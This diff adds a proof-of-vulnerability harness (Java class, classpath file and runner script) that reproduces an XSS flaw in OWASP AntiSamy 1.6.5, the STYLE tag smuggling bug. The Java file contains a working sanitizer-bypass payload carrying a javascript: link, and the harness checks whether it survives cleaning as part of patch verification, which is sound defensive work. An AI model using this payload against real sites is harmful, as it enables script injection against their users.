@@ -1,0 +1,99 @@
+diff --git a/.security-pipeline/pov/Pov.class b/.security-pipeline/pov/Pov.class
+new file mode 100644
+index 0000000..add7551
+Binary files /dev/null and b/.security-pipeline/pov/Pov.class differ
+diff --git a/.security-pipeline/pov/Pov.java b/.security-pipeline/pov/Pov.java
+new file mode 100644
+index 0000000..caee15b
+--- /dev/null
++++ b/.security-pipeline/pov/Pov.java
+@@ -0,0 +1,58 @@
++import org.owasp.validator.html.AntiSamy;
++import org.owasp.validator.html.Policy;
++
++import java.net.URL;
++
++/**
++ * Proof-of-Vulnerability for CWE-079 (XSS) in OWASP AntiSamy 1.6.5 —
++ * "STYLE tag smuggling" (CVE-2022-28367 / CVE-2022-29577).
++ *
++ * AntiSamyDOMScanner.processStyleTag() only scans the FIRST child node of a
++ * <style> element with the CSS scanner (CssScanner.scanStyleSheet) and leaves
++ * any additional child nodes untouched. Malformed markup such as
++ *   <style/>b<![cdata[</style><a href=javascript:alert(1)>test
++ * is parsed by the HTML parser into a <style> element that owns MULTIPLE child
++ * nodes. Only the first ("b") gets CSS-sanitized; the smuggled
++ * "</style><a href=javascript:alert(1)>test" survives and is emitted verbatim
++ * inside the raw (CDATA) text content of the serialized <style> element, which
++ * a browser re-parses as live HTML — a cross-site-scripting vector.
++ *
++ * This POV drives the real public API (AntiSamy.scan, DOM mode) and inspects the
++ * cleaned HTML. It exits 0 when the smuggled javascript: payload leaks into the
++ * output (vulnerable / unpatched) and exits 1 when the output no longer contains
++ * it (correctly patched — all child nodes are scanned and the smuggled tag is
++ * neutralized).
++ */
++public class Pov {
++
++    public static void main(String[] args) throws Exception {
++        URL policyUrl = Pov.class.getResource("/antisamy.xml");
++        if (policyUrl == null) {
++            System.err.println("POV ERROR: could not locate antisamy.xml policy on the classpath");
++            System.exit(2);
++        }
++        Policy policy = Policy.getInstance(policyUrl).cloneWithDirective(Policy.USE_XHTML, "true");
++        AntiSamy as = new AntiSamy();
++
++        // Smuggling payload taken from the upstream regression test for the fix.
++        String input = "<style/>b<![cdata[</style><a href=javascript:alert(1)>test";
++
++        String cleanHtml = as.scan(input, policy, AntiSamy.DOM).getCleanHTML();
++
++        System.out.println("INPUT      : " + input);
++        System.out.println("CLEAN HTML : " + cleanHtml);
++
++        // The smuggled javascript: URI must never appear in sanitized output.
++        boolean smuggled = cleanHtml.contains("javascript:alert(1)")
++                || cleanHtml.contains("href=javascript");
++
++        if (smuggled) {
++            System.out.println("VULNERABLE: smuggled 'javascript:' XSS payload survived AntiSamy sanitization "
++                    + "inside the <style> element content.");
++            System.exit(0);
++        } else {
++            System.out.println("SAFE: smuggled payload was neutralized by AntiSamy (patched).");
++            System.exit(1);
++        }
++    }
++}
+diff --git a/.security-pipeline/pov/cp.txt b/.security-pipeline/pov/cp.txt
+new file mode 100644
+index 0000000..58f69a5
+--- /dev/null
++++ b/.security-pipeline/pov/cp.txt
+@@ -0,0 +1 @@
++/root/.m2/repository/net/sourceforge/nekohtml/nekohtml/1.9.22/nekohtml-1.9.22.jar:/root/.m2/repository/org/apache/httpcomponents/httpclient/4.5.13/httpclient-4.5.13.jar:/root/.m2/repository/org/apache/httpcomponents/httpcore/4.4.15/httpcore-4.4.15.jar:/root/.m2/repository/org/apache/xmlgraphics/batik-css/1.14/batik-css-1.14.jar:/root/.m2/repository/org/apache/xmlgraphics/batik-shared-resources/1.14/batik-shared-resources-1.14.jar:/root/.m2/repository/org/apache/xmlgraphics/batik-util/1.14/batik-util-1.14.jar:/root/.m2/repository/org/apache/xmlgraphics/batik-constants/1.14/batik-constants-1.14.jar:/root/.m2/repository/org/apache/xmlgraphics/batik-i18n/1.14/batik-i18n-1.14.jar:/root/.m2/repository/org/apache/xmlgraphics/xmlgraphics-commons/2.6/xmlgraphics-commons-2.6.jar:/root/.m2/repository/commons-io/commons-io/2.6/commons-io-2.6.jar:/root/.m2/repository/org/slf4j/slf4j-api/1.7.35/slf4j-api-1.7.35.jar:/root/.m2/repository/org/slf4j/jcl-over-slf4j/1.7.35/jcl-over-slf4j-1.7.35.jar:/root/.m2/repository/org/slf4j/slf4j-simple/1.7.35/slf4j-simple-1.7.35.jar:/root/.m2/repository/xerces/xercesImpl/2.12.2/xercesImpl-2.12.2.jar:/root/.m2/repository/xml-apis/xml-apis/1.4.01/xml-apis-1.4.01.jar:/root/.m2/repository/xml-apis/xml-apis-ext/1.3.04/xml-apis-ext-1.3.04.jar:/root/.m2/repository/com/github/spotbugs/spotbugs-annotations/4.5.3/spotbugs-annotations-4.5.3.jar:/root/.m2/repository/com/google/code/findbugs/jsr305/3.0.2/jsr305-3.0.2.jar:/root/.m2/repository/commons-codec/commons-codec/1.15/commons-codec-1.15.jar:/root/.m2/repository/junit/junit/4.13.2/junit-4.13.2.jar:/root/.m2/repository/org/hamcrest/hamcrest/2.2/hamcrest-2.2.jar
+\ No newline at end of file
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..c60ae2b
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,17 @@
++#!/usr/bin/env bash
++# Proof-of-Vulnerability runner for finding-2fe2f5ad4d3b (AntiSamy STYLE tag smuggling / CWE-079).
++# Exits 0 when the vulnerable behavior is reproduced on the unpatched code,
++# and non-zero after a correct patch neutralizes the smuggled payload.
++set -euo pipefail
++
++cd "$(dirname "$0")/../.."   # -> project root (/workspace/repo)
++
++# Build the product classes and resolve the runtime classpath.
++mvn -B -q -DskipTests package
++mvn -B -q dependency:build-classpath -Dmdep.outputFile=.security-pipeline/pov/cp.txt
++
++CP="target/classes:$(cat .security-pipeline/pov/cp.txt)"
++
++# Compile and run the POV against the real AntiSamy public API.
++javac -cp "$CP" -d .security-pipeline/pov .security-pipeline/pov/Pov.java
++java -cp ".security-pipeline/pov:$CP" Pov
